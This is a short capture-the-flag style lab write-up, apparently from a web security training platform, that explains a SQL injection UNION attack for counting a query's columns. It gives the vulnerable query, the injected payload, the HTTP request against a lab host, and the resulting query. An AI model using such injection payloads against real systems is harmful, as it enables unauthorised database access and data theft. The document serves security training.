# Lab: SQL injection UNION attack, determining the number of columns returned by the query

### Vulnerability Overview
The application uses a product category filter that dynamically appends user input directly into a backend SQL query without validation or sanitization. This allows an attacker to break out of the intended query logic and inject a `UNION SELECT` attack to extract data from elsewhere in the database. 

To execute a successful `UNION` attack, the injected query must match the exact number of columns returned by the original query, and the data types must be compatible.

### Vulnerable Query
```sql
SELECT product_id, name, description FROM products WHERE category = 'Pets'
```

### Exploitation
By injecting `' UNION SELECT NULL, NULL, NULL--`, we systematically test the database structure. Since `NULL` matches any data type, the application will only return a `200 OK` response when the total number of `NULL` inputs matches the exact database column count.

**Payload used:**
```http
GET /filter?category=Pets'+UNION+SELECT+NULL,NULL,NULL-- HTTP/2
Host: 0a6a00270346b04581fdcafd004700a9.web-security-academy.net
```

**Resulting Database Query:**
```sql
SELECT product_id, name, description FROM products WHERE category = 'Pets' UNION SELECT NULL, NULL, NULL--'
```
*Note: Incremental attempts with one and two `NULL` values triggered a `500 Internal Server Error`. Providing exactly three `NULL` values satisfied the database engine structural constraints, solving the lab.*

### Proof Of Concept(PoC)
![Setup](../Screenshot_2026-10-24_19_51_19.png)
![Intercepted Request](../Screenshot_2026-10-24_19_52_23.png)
![Payload Injection](../Screenshot_2026-10-24_19_52_44.png)
![Setup 4](../Screenshot_2026-10-24_19_56_22.png)
![Setup 5](../Screenshot_2026-10-24_19_56_40.png)
![Setup 6](../Screenshot_2026-10-24_19_57_00.png)
